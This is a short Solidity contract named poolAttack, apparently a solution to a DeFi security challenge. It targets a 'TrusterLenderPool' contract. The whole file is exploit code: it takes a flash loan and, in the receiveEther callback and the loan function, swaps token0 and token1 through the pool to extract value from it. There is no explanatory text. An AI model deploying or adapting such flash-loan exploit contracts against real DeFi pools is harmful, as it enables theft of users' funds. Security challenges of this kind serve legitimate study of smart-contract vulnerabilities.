// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;
pragma solidity ^0.8.0;
import "./TrusterLenderPool.sol";
contract poolAttack{
    TrusterLenderPool public pool;
    Cert public token0;
    Cert public token1;
    constructor(address _pool){
        pool = TrusterLenderPool(_pool);
        token0=pool.token0();
        token1 = pool.token1();
    }
    function loan(uint256 amount)public{
        pool.flashLoan(amount,address(this));
        token1.approve(address(pool),amount);
        pool.swap(address(token0),amount);
    }
    function receiveEther(uint256 amount)public{
        token0.approve(address(pool),amount);
        pool.swap(address(token1),amount);
    }
    // function ended(uint256 amount)public{
    //     token1.approve(address(pool),amount);
    //     pool.swap(address(token0),amount);
    // }
    fallback()external payable{}
}